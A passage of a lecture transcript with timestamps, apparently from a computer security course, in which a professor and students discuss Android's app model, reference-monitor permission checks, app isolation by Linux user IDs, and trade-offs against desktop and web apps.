              <time_slice>26:42</time_slice>
              <text_slice>applications.</text_slice>
            </slice>
            <slice>
              <time_slice>26:44</time_slice>
              <text_slice>So presumably, actually,
I don't know exactly why</text_slice>
            </slice>
            <slice>
              <time_slice>26:47</time_slice>
              <text_slice>they chose to do it this way.</text_slice>
            </slice>
            <slice>
              <time_slice>26:48</time_slice>
              <text_slice>Perhaps it's to get away from
having a reference monitor be</text_slice>
            </slice>
            <slice>
              <time_slice>26:52</time_slice>
              <text_slice>any kind of bottleneck for
[? handy ?] communication.</text_slice>
            </slice>
            <slice>
              <time_slice>26:55</time_slice>
              <text_slice>But it means that the
permissions for individual RPC</text_slice>
            </slice>
            <slice>
              <time_slice>27:00</time_slice>
              <text_slice>operations between
the applications</text_slice>
            </slice>
            <slice>
              <time_slice>27:02</time_slice>
              <text_slice>have to be done in software
inside of the application</text_slice>
            </slice>
            <slice>
              <time_slice>27:04</time_slice>
              <text_slice>logic, which is a little bit
unfortunate if we want to avoid</text_slice>
            </slice>
            <slice>
              <time_slice>27:08</time_slice>
              <text_slice>the application developer
making these kinds of mistakes</text_slice>
            </slice>
            <slice>
              <time_slice>27:11</time_slice>
              <text_slice>and maybe forgetting to check
the permissions on some RPC</text_slice>
            </slice>
            <slice>
              <time_slice>27:14</time_slice>
              <text_slice>calls.</text_slice>
            </slice>
            <slice>
              <time_slice>27:16</time_slice>
              <text_slice>So in some ways, if you are
purely worried about security,</text_slice>
            </slice>
            <slice>
              <time_slice>27:18</time_slice>
              <text_slice>it might have been nicer
to forward all the RPCs</text_slice>
            </slice>
            <slice>
              <time_slice>27:21</time_slice>
              <text_slice>through the reference
monitor as well,</text_slice>
            </slice>
            <slice>
              <time_slice>27:23</time_slice>
              <text_slice>because then the reference
monitor is going to make sure</text_slice>
            </slice>
            <slice>
              <time_slice>27:26</time_slice>
              <text_slice>that it checks permissions
on every RPC call</text_slice>
            </slice>
            <slice>
              <time_slice>27:29</time_slice>
              <text_slice>instead of just at
the time you establish</text_slice>
            </slice>
            <slice>
              <time_slice>27:31</time_slice>
              <text_slice>a channel for future RPC
calls between two apps.</text_slice>
            </slice>
            <slice>
              <time_slice>27:34</time_slice>
              <text_slice>That make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>27:38</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>27:39</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>27:40</time_slice>
              <text_slice>So let's try to figure out-- one
interesting thing [? to do ?]</text_slice>
            </slice>
            <slice>
              <time_slice>27:44</time_slice>
              <text_slice>to try to contrast is, why
did these guys-- before we</text_slice>
            </slice>
            <slice>
              <time_slice>27:48</time_slice>
              <text_slice>dive into a little
bit more details,</text_slice>
            </slice>
            <slice>
              <time_slice>27:50</time_slice>
              <text_slice>why did these guys
design a whole new app</text_slice>
            </slice>
            <slice>
              <time_slice>27:52</time_slice>
              <text_slice>model for Android applications
as opposed to-- we've</text_slice>
            </slice>
            <slice>
              <time_slice>27:57</time_slice>
              <text_slice>seen already.</text_slice>
            </slice>
            <slice>
              <time_slice>27:57</time_slice>
              <text_slice>There's desktop applications,
there's web applications.</text_slice>
            </slice>
            <slice>
              <time_slice>28:00</time_slice>
              <text_slice>Why did these guys
invent a whole new way</text_slice>
            </slice>
            <slice>
              <time_slice>28:02</time_slice>
              <text_slice>of writing software?</text_slice>
            </slice>
            <slice>
              <time_slice>28:03</time_slice>
              <text_slice>Because in some ways, this is
confusing for the developer,</text_slice>
            </slice>
            <slice>
              <time_slice>28:05</time_slice>
              <text_slice>because I am used to
writing my nice little C</text_slice>
            </slice>
            <slice>
              <time_slice>28:08</time_slice>
              <text_slice>program with a main function.</text_slice>
            </slice>
            <slice>
              <time_slice>28:09</time_slice>
              <text_slice>I look at this and say,
well, what the hell?</text_slice>
            </slice>
            <slice>
              <time_slice>28:11</time_slice>
              <text_slice>I mean, what am I
going to do with-- I</text_slice>
            </slice>
            <slice>
              <time_slice>28:13</time_slice>
              <text_slice>have to define four
kinds of components,</text_slice>
            </slice>
            <slice>
              <time_slice>28:14</time_slice>
              <text_slice>and I have to send
intents instead</text_slice>
            </slice>
            <slice>
              <time_slice>28:16</time_slice>
              <text_slice>of just having a C
struct and writing</text_slice>
            </slice>
            <slice>
              <time_slice>28:18</time_slice>
              <text_slice>[? straight line ?] code.</text_slice>
            </slice>
            <slice>
              <time_slice>28:20</time_slice>
              <text_slice>So what are the pros or
cons of existing app models?</text_slice>
            </slice>
            <slice>
              <time_slice>28:24</time_slice>
              <text_slice>So we have, I guess,
desktop apps and web apps.</text_slice>
            </slice>
            <slice>
              <time_slice>28:33</time_slice>
              <text_slice>Why do we need a third
column, so to say?</text_slice>
            </slice>
            <slice>
              <time_slice>28:36</time_slice>
              <text_slice>Because what are the nice
things about these guys?</text_slice>
            </slice>
            <slice>
              <time_slice>28:38</time_slice>
              <text_slice>Yeah?</text_slice>
            </slice>
            <slice>
              <time_slice>28:39</time_slice>
              <text_slice>AUDIENCE: Well, the model has
completely changed now, right?</text_slice>
            </slice>
            <slice>
              <time_slice>28:41</time_slice>
              <text_slice>Because I think on
desktop apps, you</text_slice>
            </slice>
            <slice>
              <time_slice>28:43</time_slice>
              <text_slice>don't put as much
trust in the developers</text_slice>
            </slice>
            <slice>
              <time_slice>28:45</time_slice>
              <text_slice>as you put in mobile apps.</text_slice>
            </slice>
            <slice>
              <time_slice>28:48</time_slice>
              <text_slice>And you have a bunch of
more users that are less</text_slice>
            </slice>
            <slice>
              <time_slice>28:51</time_slice>
              <text_slice>[? inexperienced ?] than the
desktop users who end up having</text_slice>
            </slice>
            <slice>
              <time_slice>28:54</time_slice>
              <text_slice>a bunch of apps that really
want to [? isolate ?] from each</text_slice>
            </slice>
            <slice>
              <time_slice>28:57</time_slice>
              <text_slice>other.</text_slice>
            </slice>
            <slice>
              <time_slice>28:58</time_slice>
              <text_slice>PROFESSOR: It could be.</text_slice>
            </slice>
            <slice>
              <time_slice>28:58</time_slice>
              <text_slice>So you think in
the desktop case,</text_slice>
            </slice>
            <slice>
              <time_slice>29:00</time_slice>
              <text_slice>we don't have to trust
the developers as much?</text_slice>
            </slice>
            <slice>
              <time_slice>29:02</time_slice>
              <text_slice>AUDIENCE: Of course you do.</text_slice>
            </slice>
            <slice>
              <time_slice>29:03</time_slice>
              <text_slice>But it seems that there's always
like your son or your cousin</text_slice>
            </slice>
            <slice>
              <time_slice>29:07</time_slice>
              <text_slice>that you take care of their
desktop if it goes bad.</text_slice>
            </slice>
            <slice>
              <time_slice>29:10</time_slice>
              <text_slice>PROFESSOR: [LAUGHS]</text_slice>
            </slice>
            <slice>
              <time_slice>29:11</time_slice>
              <text_slice>AUDIENCE: But with
your phone, there's</text_slice>
            </slice>
            <slice>
              <time_slice>29:12</time_slice>
              <text_slice>a different problem altogether.</text_slice>
            </slice>
            <slice>
              <time_slice>29:13</time_slice>
              <text_slice>PROFESSOR: I guess it's cool
that the phones don't need</text_slice>
            </slice>
            <slice>
              <time_slice>29:15</time_slice>
              <text_slice>a cousin to take care of them.</text_slice>
            </slice>
            <slice>
              <time_slice>29:16</time_slice>
              <text_slice>So that's great, right?</text_slice>
            </slice>
            <slice>
              <time_slice>29:18</time_slice>
              <text_slice>But in terms of security,
one thing on the desktop apps</text_slice>
            </slice>
            <slice>
              <time_slice>29:21</time_slice>
              <text_slice>is that you can't
install-- or it's</text_slice>
            </slice>
            <slice>
              <time_slice>29:24</time_slice>
              <text_slice>really hard to install
new apps or maybe-- well,</text_slice>
            </slice>
            <slice>
              <time_slice>29:32</time_slice>
              <text_slice>probably not quite exactly
true, because you can always</text_slice>
            </slice>
            <slice>
              <time_slice>29:36</time_slice>
              <text_slice>click an executable and install
an app on a desktop case.</text_slice>
            </slice>
            <slice>
              <time_slice>29:38</time_slice>
              <text_slice>But I guess people don't install
apps regularly sort of tend to</text_slice>
            </slice>
            <slice>
              <time_slice>29:42</time_slice>
              <text_slice>maybe-- because it
depends on the usage</text_slice>
            </slice>
            <slice>
              <time_slice>29:43</time_slice>
              <text_slice>model of a desktop app.</text_slice>
            </slice>
            <slice>
              <time_slice>29:44</time_slice>
              <text_slice>But typically, you have
a fixed set of software</text_slice>
            </slice>
            <slice>
              <time_slice>29:47</time_slice>
              <text_slice>you are running as
opposed to on a web app,</text_slice>
            </slice>
            <slice>
              <time_slice>29:49</time_slice>
              <text_slice>one cool thing is that it's
very easy to run new apps.</text_slice>
            </slice>
            <slice>
              <time_slice>29:56</time_slice>
              <text_slice>You just visit a website,
and there's nothing really</text_slice>
            </slice>
            <slice>
              <time_slice>29:59</time_slice>
              <text_slice>you have to do other
than click on a link.</text_slice>
            </slice>
            <slice>
              <time_slice>30:01</time_slice>
              <text_slice>And off you are on some new site
running some new Application.</text_slice>
            </slice>
            <slice>
              <time_slice>30:05</time_slice>
              <text_slice>So that's a pretty nice
property of web apps.</text_slice>
            </slice>
            <slice>
              <time_slice>30:07</time_slice>
              <text_slice>One bummer about desktop
apps is that there's actually</text_slice>
            </slice>
            <slice>
              <time_slice>30:11</time_slice>
              <text_slice>no isolation at all
between applications.</text_slice>
            </slice>
            <slice>
              <time_slice>30:16</time_slice>
              <text_slice>That's perhaps somewhat
related to the fact</text_slice>
            </slice>
            <slice>
              <time_slice>30:18</time_slice>
              <text_slice>that it's hard to
install an app,</text_slice>
            </slice>
            <slice>
              <time_slice>30:19</time_slice>
              <text_slice>because you really
are trusting it</text_slice>
            </slice>
            <slice>
              <time_slice>30:21</time_slice>
              <text_slice>fully with all the
data on your machine</text_slice>
            </slice>
            <slice>
              <time_slice>30:23</time_slice>
              <text_slice>when you're installing it.</text_slice>
            </slice>
            <slice>
              <time_slice>30:24</time_slice>
              <text_slice>There is no isolation
between one app</text_slice>
            </slice>
            <slice>
              <time_slice>30:27</time_slice>
              <text_slice>that you install in your laptop
and probably any other thing</text_slice>
            </slice>
            <slice>
              <time_slice>30:30</time_slice>
              <text_slice>running there, or
any of the data</text_slice>
            </slice>
            <slice>
              <time_slice>30:31</time_slice>
              <text_slice>that you are storing
on that computer.</text_slice>
            </slice>
            <slice>
              <time_slice>30:33</time_slice>
              <text_slice>Whereas in the web
app case, there's</text_slice>
            </slice>
            <slice>
              <time_slice>30:35</time_slice>
              <text_slice>some reasonable isolation.</text_slice>
            </slice>
            <slice>
              <time_slice>30:38</time_slice>
              <text_slice>As long as you believe the
same origin policy is correctly</text_slice>
            </slice>
            <slice>
              <time_slice>30:41</time_slice>
              <text_slice>[INAUDIBLE] by the browser, then
you're in pretty good shape.</text_slice>
            </slice>
            <slice>
              <time_slice>30:44</time_slice>
              <text_slice>It's reasonably safe to probably
go to some arbitrary website</text_slice>
            </slice>
            <slice>
              <time_slice>30:47</time_slice>
              <text_slice>and start using
their application.</text_slice>
            </slice>
            <slice>
              <time_slice>30:49</time_slice>
              <text_slice>It's not going to
tamper with other sites</text_slice>
            </slice>
            <slice>
              <time_slice>30:51</time_slice>
              <text_slice>that you have open
in your browser,</text_slice>
            </slice>
            <slice>
              <time_slice>30:53</time_slice>
              <text_slice>assuming they don't
exploit some browser bugs.</text_slice>
            </slice>
            <slice>
              <time_slice>30:58</time_slice>
              <text_slice>So far, it looks like the web
apps are the winning plan.</text_slice>
            </slice>
            <slice>
              <time_slice>31:01</time_slice>
              <text_slice>They're easy to use,
they have isolation.</text_slice>
            </slice>
            <slice>
              <time_slice>31:04</time_slice>
              <text_slice>Why don't these guys use
web apps for Android?</text_slice>
            </slice>
            <slice>
              <time_slice>31:07</time_slice>
              <text_slice>Yeah?</text_slice>
            </slice>
            <slice>
              <time_slice>31:08</time_slice>
              <text_slice>AUDIENCE: So web
apps are starting</text_slice>
            </slice>
            <slice>
              <time_slice>31:09</time_slice>
              <text_slice>to become like an operating
system in themselves, right?</text_slice>
            </slice>
            <slice>
              <time_slice>31:12</time_slice>
              <text_slice>So you have Firefox OX, which is
basically just a web mobile OS.</text_slice>
            </slice>
            <slice>
              <time_slice>31:18</time_slice>
              <text_slice>PROFESSOR: Right.</text_slice>
            </slice>
            <slice>
              <time_slice>31:19</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>31:19</time_slice>
              <text_slice>So you're arguing that actually
these guys were mistaken.</text_slice>
            </slice>
            <slice>
              <time_slice>31:22</time_slice>
              <text_slice>They shouldn't have built
a new Android stack.</text_slice>
            </slice>
            <slice>
              <time_slice>31:24</time_slice>
              <text_slice>They should have just
done a giant web browser</text_slice>
            </slice>
            <slice>
              <time_slice>31:28</time_slice>
              <text_slice>as your phone.</text_slice>
            </slice>
            <slice>
              <time_slice>31:29</time_slice>
              <text_slice>AUDIENCE: Well, at least Mozilla
has shown that it's possible.</text_slice>
            </slice>
            <slice>
              <time_slice>31:32</time_slice>
              <text_slice>PROFESSOR: Right.</text_slice>
            </slice>
            <slice>
              <time_slice>31:33</time_slice>
              <text_slice>OK, fair enough.</text_slice>
            </slice>
            <slice>
              <time_slice>31:35</time_slice>
              <text_slice>So it's at least more reasonable
to go with the web apps</text_slice>
            </slice>
            <slice>
              <time_slice>31:38</time_slice>
              <text_slice>route rather than the desktop
route, at least for phone.</text_slice>
            </slice>
            <slice>
              <time_slice>31:41</time_slice>
              <text_slice>Yeah?</text_slice>
            </slice>
            <slice>
              <time_slice>31:41</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE]
phone call from a web apps,</text_slice>
            </slice>
            <slice>
              <time_slice>31:45</time_slice>
              <text_slice>you need [? an entire new ?]
API for the web app interface</text_slice>
            </slice>
            <slice>
              <time_slice>31:48</time_slice>
              <text_slice>with the phone.</text_slice>
            </slice>
            <slice>
              <time_slice>31:49</time_slice>
              <text_slice>PROFESSOR: Right.</text_slice>
            </slice>
            <slice>
              <time_slice>31:50</time_slice>
              <text_slice>So the one limitation that
might be fixable, of course,</text_slice>
            </slice>
            <slice>
              <time_slice>31:53</time_slice>
              <text_slice>but is still there
is maybe there's</text_slice>
            </slice>
            <slice>
              <time_slice>31:58</time_slice>
              <text_slice>no APIs for some of the devices.</text_slice>
            </slice>
            <slice>
              <time_slice>32:03</time_slice>
              <text_slice>This is increasingly
becoming less so.</text_slice>
            </slice>
            <slice>
              <time_slice>32:04</time_slice>
              <text_slice>Like, for a camera or for
a GPS, these are slowly</text_slice>
            </slice>
            <slice>
              <time_slice>32:08</time_slice>
              <text_slice>being added to the web case.</text_slice>
            </slice>
            <slice>
              <time_slice>32:10</time_slice>
              <text_slice>But there is probably
not quite an API</text_slice>
            </slice>
            <slice>
              <time_slice>32:12</time_slice>
              <text_slice>for accessing your phone
yet, or sending an SMS</text_slice>
            </slice>
            <slice>
              <time_slice>32:15</time_slice>
              <text_slice>message, and things like that.</text_slice>
            </slice>
            <slice>
              <time_slice>32:18</time_slice>
              <text_slice>Another bummer in web apps
is there is actually limited</text_slice>
            </slice>
            <slice>
              <time_slice>32:22</time_slice>
              <text_slice>sharing that you can do.</text_slice>
            </slice>
            <slice>
              <time_slice>32:24</time_slice>
              <text_slice>So we were just talking
about implicit intents</text_slice>
            </slice>
            <slice>
              <time_slice>32:27</time_slice>
              <text_slice>in Android, where you
could just say, well,</text_slice>
            </slice>
            <slice>
              <time_slice>32:28</time_slice>
              <text_slice>I want to view
this JPEG picture,</text_slice>
            </slice>
            <slice>
              <time_slice>32:30</time_slice>
              <text_slice>but who knows what
application's going to open it?</text_slice>
            </slice>
            <slice>
              <time_slice>32:32</time_slice>
              <text_slice>Or I want to view this PDF file.</text_slice>
            </slice>
            <slice>
              <time_slice>32:34</time_slice>
              <text_slice>Or I want to share
this picture I just</text_slice>
            </slice>
            <slice>
              <time_slice>32:36</time_slice>
              <text_slice>took with my camera with
a friend through email,</text_slice>
            </slice>
            <slice>
              <time_slice>32:38</time_slice>
              <text_slice>but I don't know what email
application you're using.</text_slice>
            </slice>
            <slice>
              <time_slice>32:40</time_slice>
              <text_slice>Let's just ask the
reference monitor</text_slice>
            </slice>
            <slice>
              <time_slice>32:43</time_slice>
              <text_slice>to find me some
email program that's</text_slice>
            </slice>
            <slice>
              <time_slice>32:45</time_slice>
              <text_slice>going to send this picture out.</text_slice>
            </slice>
            <slice>
              <time_slice>32:47</time_slice>
              <text_slice>So it's something you can
actually do in Android.</text_slice>
            </slice>
            <slice>
              <time_slice>32:49</time_slice>
              <text_slice>But it's kind of hard
to do in a web app case,</text_slice>
            </slice>
            <slice>
              <time_slice>32:51</time_slice>
              <text_slice>because every
interaction, you have</text_slice>
            </slice>
            <slice>
              <time_slice>32:53</time_slice>
              <text_slice>to refer to a particular URL.</text_slice>
            </slice>
            <slice>
              <time_slice>32:55</time_slice>
              <text_slice>So if you don't know what
PDF viewer someone is using,</text_slice>
            </slice>
            <slice>
              <time_slice>32:57</time_slice>
              <text_slice>you might not know
what URL to open</text_slice>
            </slice>
            <slice>
              <time_slice>33:01</time_slice>
              <text_slice>to ask it to view the PDF
[? potentially. ?] Question?</text_slice>
            </slice>
            <slice>
              <time_slice>33:05</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>33:08</time_slice>
              <text_slice>But JavaScript is very
hard to read [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>33:11</time_slice>
              <text_slice>PROFESSOR: Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>33:12</time_slice>
              <text_slice>So one bummer is that yeah,
this is all JavaScript. [LAUGHS]</text_slice>
            </slice>
            <slice>
              <time_slice>33:16</time_slice>
              <text_slice>So it's potentially unfortunate.</text_slice>
            </slice>
            <slice>
              <time_slice>33:17</time_slice>
              <text_slice>But it's maybe not as good
in terms of performance.</text_slice>
            </slice>
            <slice>
              <time_slice>33:20</time_slice>
              <text_slice>Maybe it's hard to
understand what it's doing.</text_slice>
            </slice>
            <slice>
              <time_slice>33:24</time_slice>
              <text_slice>It might be hard to compile
efficiently, et cetera.</text_slice>
            </slice>
            <slice>
              <time_slice>33:29</time_slice>
              <text_slice>Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>33:31</time_slice>
              <text_slice>Because one nice thing about
the desktop [INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>33:33</time_slice>
              <text_slice>is that sharing is easy.</text_slice>
            </slice>
            <slice>
              <time_slice>33:36</time_slice>
              <text_slice>So one side effect of having
all your files be accessible</text_slice>
            </slice>
            <slice>
              <time_slice>33:39</time_slice>
              <text_slice>in every app is that,
well, you just share.</text_slice>
            </slice>
            <slice>
              <time_slice>33:42</time_slice>
              <text_slice>It's very easy to access
any data you have.</text_slice>
            </slice>
            <slice>
              <time_slice>33:45</time_slice>
              <text_slice>And in some ways, if you
really want a lot of sharing,</text_slice>
            </slice>
            <slice>
              <time_slice>33:48</time_slice>
              <text_slice>this is great.</text_slice>
            </slice>
            <slice>
              <time_slice>33:49</time_slice>
              <text_slice>Like, I probably could-- it
might be a little bit tricky</text_slice>
            </slice>
            <slice>
              <time_slice>33:52</time_slice>
              <text_slice>to implement some things
on Android that are</text_slice>
            </slice>
            <slice>
              <time_slice>33:54</time_slice>
              <text_slice>easy to do in the desktop case.</text_slice>
            </slice>
            <slice>
              <time_slice>33:55</time_slice>
              <text_slice>So in the desktop
case, if I want</text_slice>
            </slice>
            <slice>
              <time_slice>33:56</time_slice>
              <text_slice>to compile a piece of software,
I'm going to run [? Make. ?]</text_slice>
            </slice>
            <slice>
              <time_slice>33:59</time_slice>
              <text_slice>That's going to run GCC
and maybe other programs.</text_slice>
            </slice>
            <slice>
              <time_slice>34:04</time_slice>
              <text_slice>And they're all collaborating
on the same C source</text_slice>
            </slice>
            <slice>
              <time_slice>34:06</time_slice>
              <text_slice>code in the single directory.</text_slice>
            </slice>
            <slice>
              <time_slice>34:08</time_slice>
              <text_slice>They're all building it.</text_slice>
            </slice>
            <slice>
              <time_slice>34:09</time_slice>
              <text_slice>It might be a
little bit trickier</text_slice>
            </slice>
            <slice>
              <time_slice>34:11</time_slice>
              <text_slice>to do in the Android case,
where data is kind of associated</text_slice>
            </slice>
            <slice>
              <time_slice>34:14</time_slice>
              <text_slice>with a primary
application, but storing it</text_slice>
            </slice>
            <slice>
              <time_slice>34:17</time_slice>
              <text_slice>in a [? quantum ?] provider.</text_slice>
            </slice>
            <slice>
              <time_slice>34:18</time_slice>
              <text_slice>So it might be a
little bit tricky</text_slice>
            </slice>
            <slice>
              <time_slice>34:20</time_slice>
              <text_slice>to have an Android world where
I have my source code stored</text_slice>
            </slice>
            <slice>
              <time_slice>34:23</time_slice>
              <text_slice>somewhere, and then I
install a C compiler,</text_slice>
            </slice>
            <slice>
              <time_slice>34:25</time_slice>
              <text_slice>and [? a Make ?] program, and
an assembler, and other things.</text_slice>
            </slice>
            <slice>
              <time_slice>34:28</time_slice>
              <text_slice>And they all sort
of work together.</text_slice>
            </slice>
            <slice>
              <time_slice>34:30</time_slice>
              <text_slice>It's a little bit harder to do.</text_slice>
            </slice>
            <slice>
              <time_slice>34:32</time_slice>
              <text_slice>You probably could
do it somehow.</text_slice>
            </slice>
            <slice>
              <time_slice>34:34</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>34:37</time_slice>
              <text_slice>PROFESSOR: Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>34:37</time_slice>
              <text_slice>So you could probably work
around it in some ways.</text_slice>
            </slice>
            <slice>
              <time_slice>34:40</time_slice>
              <text_slice>So I think Android is certainly
general purpose enough</text_slice>
            </slice>
            <slice>
              <time_slice>34:42</time_slice>
              <text_slice>to let you somehow do it.</text_slice>
            </slice>
            <slice>
              <time_slice>34:44</time_slice>
              <text_slice>But it's probably not quite as
natural to do this in Android</text_slice>
            </slice>
            <slice>
              <time_slice>34:49</time_slice>
              <text_slice>as it would be in
a desktop case.</text_slice>
            </slice>
            <slice>
              <time_slice>34:51</time_slice>
              <text_slice>Not that I'm arguing
the desktop case.</text_slice>
            </slice>
            <slice>
              <time_slice>34:53</time_slice>
              <text_slice>But it's not quite as secure.</text_slice>
            </slice>
            <slice>
              <time_slice>34:54</time_slice>
              <text_slice>But yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>34:56</time_slice>
              <text_slice>Any other comments?</text_slice>
            </slice>
            <slice>
              <time_slice>34:56</time_slice>
              <text_slice>Yeah?</text_slice>
            </slice>
            <slice>
              <time_slice>34:57</time_slice>
              <text_slice>AUDIENCE: Another
thing might be the case</text_slice>
            </slice>
            <slice>
              <time_slice>35:00</time_slice>
              <text_slice>that we're optimizing
for different web</text_slice>
            </slice>
            <slice>
              <time_slice>35:02</time_slice>
              <text_slice>apps [INAUDIBLE] constrained.</text_slice>
            </slice>
            <slice>
              <time_slice>35:05</time_slice>
              <text_slice>I'm not sure what [INAUDIBLE]
tend to be constrained by.</text_slice>
            </slice>
            <slice>
              <time_slice>35:08</time_slice>
              <text_slice>But [? web apps ?]
tend to be constrained</text_slice>
            </slice>
            <slice>
              <time_slice>35:10</time_slice>
              <text_slice>by both RAM and processing.</text_slice>
            </slice>
            <slice>
              <time_slice>35:13</time_slice>
              <text_slice>And much more so than either
desktop or web apps, certainly.</text_slice>
            </slice>
            <slice>
              <time_slice>35:16</time_slice>
              <text_slice>PROFESSOR: Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>35:16</time_slice>
              <text_slice>So it might be that solid
engineering decisions</text_slice>
            </slice>
            <slice>
              <time_slice>35:19</time_slice>
              <text_slice>around how to
optimize these things</text_slice>
            </slice>
            <slice>
              <time_slice>35:21</time_slice>
              <text_slice>are going to be different.</text_slice>
            </slice>
            <slice>
              <time_slice>35:22</time_slice>
              <text_slice>I guess one unfortunate
thing about web apps,</text_slice>
            </slice>
            <slice>
              <time_slice>35:23</time_slice>
              <text_slice>at least at the time these
guys were designing Android,</text_slice>
            </slice>
            <slice>
              <time_slice>35:26</time_slice>
              <text_slice>is that it was difficult
to run a web app offline.</text_slice>
            </slice>
            <slice>
              <time_slice>35:28</time_slice>
              <text_slice>If your phone doesn't have
strong enough cellphone</text_slice>
            </slice>
            <slice>
              <time_slice>35:32</time_slice>
              <text_slice>reception, then it might be hard
for you to run the application</text_slice>
            </slice>
            <slice>
              <time_slice>35:35</time_slice>
              <text_slice>if some parts of it
fell out of the cache.</text_slice>
            </slice>
            <slice>
              <time_slice>35:37</time_slice>
              <text_slice>I think slowly, as
you were pointing out,</text_slice>
            </slice>
            <slice>
              <time_slice>35:39</time_slice>
              <text_slice>the web app world is
catching up to Android.</text_slice>
            </slice>
            <slice>
              <time_slice>35:42</time_slice>
              <text_slice>But many of these
limitations are getting</text_slice>
            </slice>
            <slice>
              <time_slice>35:44</time_slice>
              <text_slice>fixed or sort of improved.</text_slice>
            </slice>
            <slice>
              <time_slice>35:48</time_slice>
              <text_slice>So it might be that
these days, web</text_slice>
            </slice>
            <slice>
              <time_slice>35:50</time_slice>
              <text_slice>apps are a reasonable model for
starting a new phone platform.</text_slice>
            </slice>
            <slice>
              <time_slice>35:53</time_slice>
              <text_slice>But five years ago,
this Android world</text_slice>
            </slice>
            <slice>
              <time_slice>35:56</time_slice>
              <text_slice>was necessary, because the
web apps weren't quite there.</text_slice>
            </slice>
            <slice>
              <time_slice>35:59</time_slice>
              <text_slice>Probably not quite there
still yet, but nowadays,</text_slice>
            </slice>
            <slice>
              <time_slice>36:03</time_slice>
              <text_slice>it might be easier
to push the web apps</text_slice>
            </slice>
            <slice>
              <time_slice>36:05</time_slice>
              <text_slice>all the way to where Android is
rather than start from scratch.</text_slice>
            </slice>
            <slice>
              <time_slice>36:10</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>36:11</time_slice>
              <text_slice>So I guess we can still
talk about what Android</text_slice>
            </slice>
            <slice>
              <time_slice>36:17</time_slice>
              <text_slice>did even though maybe
today you wouldn't</text_slice>
            </slice>
            <slice>
              <time_slice>36:19</time_slice>
              <text_slice>have done it the same way.</text_slice>
            </slice>
            <slice>
              <time_slice>36:21</time_slice>
              <text_slice>But I guess in
terms of isolation,</text_slice>
            </slice>
            <slice>
              <time_slice>36:24</time_slice>
              <text_slice>we can start talking maybe about
security a little bit more.</text_slice>
            </slice>
            <slice>
              <time_slice>36:28</time_slice>
              <text_slice>Android relies on
the Linux kernel,</text_slice>
            </slice>
            <slice>
              <time_slice>36:30</time_slice>
              <text_slice>as I mentioned, to isolate
these apps from one another.</text_slice>
            </slice>
            <slice>
              <time_slice>36:33</time_slice>
              <text_slice>So what happens is that the
Android framework actually</text_slice>
            </slice>
            <slice>
              <time_slice>36:38</time_slice>
              <text_slice>sets user IDs so that this
application has perhaps</text_slice>
            </slice>
            <slice>
              <time_slice>36:45</time_slice>
              <text_slice>UID 1,001.</text_slice>
            </slice>
            <slice>
              <time_slice>36:47</time_slice>
              <text_slice>This application
runs as UID 1,002.</text_slice>
            </slice>
            <slice>
              <time_slice>36:49</time_slice>
              <text_slice>And the reference monitor
is basically [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>36:53</time_slice>
              <text_slice>So I think it
might run as UID 0,</text_slice>
            </slice>
            <slice>
              <time_slice>36:55</time_slice>
              <text_slice>although I forget the detail.</text_slice>
            </slice>
            <slice>
              <time_slice>36:57</time_slice>
              <text_slice>But I think it does run
as UID 0 on Android.</text_slice>
            </slice>
            <slice>
              <time_slice>37:01</time_slice>
              <text_slice>So the Linux kernel is largely
responsible for keeping</text_slice>
            </slice>
            <slice>
              <time_slice>37:04</time_slice>
              <text_slice>the apps separate
from one another.</text_slice>
            </slice>
            <slice>
              <time_slice>37:08</time_slice>
              <text_slice>And mostly, interactions
between user IDs</text_slice>
            </slice>
            <slice>
              <time_slice>37:10</time_slice>
              <text_slice>happens through these intents.</text_slice>
            </slice>
            <slice>
              <time_slice>37:13</time_slice>
              <text_slice>And then there's a little bit
of details in terms of things</text_slice>
            </slice>
            <slice>
              <time_slice>37:15</time_slice>
              <text_slice>that the Linux kernel
actually enforces</text_slice>
            </slice>
            <slice>
              <time_slice>37:17</time_slice>
              <text_slice>in terms of which UID is allowed
to do which operation as well.</text_slice>
            </slice>
            <slice>
              <time_slice>37:22</time_slice>
              <text_slice>So we'll talk about
that in a second.</text_slice>
            </slice>
            <slice>
              <time_slice>37:24</time_slice>
              <text_slice>One interesting question is
why did these guys choose Java?</text_slice>
            </slice>
            <slice>
              <time_slice>37:28</time_slice>
              <text_slice>Like, what's the role
of Java in Android?</text_slice>
            </slice>
            <slice>
              <time_slice>37:32</time_slice>
              <text_slice>Why is Java there at all?</text_slice>
            </slice>
            <slice>
              <time_slice>37:36</time_slice>
              <text_slice>Is it enforcing anything?</text_slice>
            </slice>
            <slice>
              <time_slice>37:37</time_slice>
              <text_slice>Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>37:37</time_slice>
              <text_slice>AUDIENCE: I think it
enforces [? text messaging ?]</text_slice>
            </slice>
            <slice>
              <time_slice>37:39</time_slice>
              <text_slice>and [? downstreaming. ?]</text_slice>
            </slice>
            <slice>
              <time_slice>37:40</time_slice>
              <text_slice>PROFESSOR: Right.</text_slice>
            </slice>
            <slice>
              <time_slice>37:41</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>37:42</time_slice>
              <text_slice>So what do we get out of it?</text_slice>
            </slice>
            <slice>
              <time_slice>37:43</time_slice>
              <text_slice>Is it like for security,
for probability?</text_slice>
            </slice>
            <slice>
              <time_slice>37:50</time_slice>
              <text_slice>One other way to think of
it is suppose we took away</text_slice>
            </slice>
            <slice>
              <time_slice>37:52</time_slice>
              <text_slice>Java and made all the
apps written in C,</text_slice>
            </slice>
            <slice>
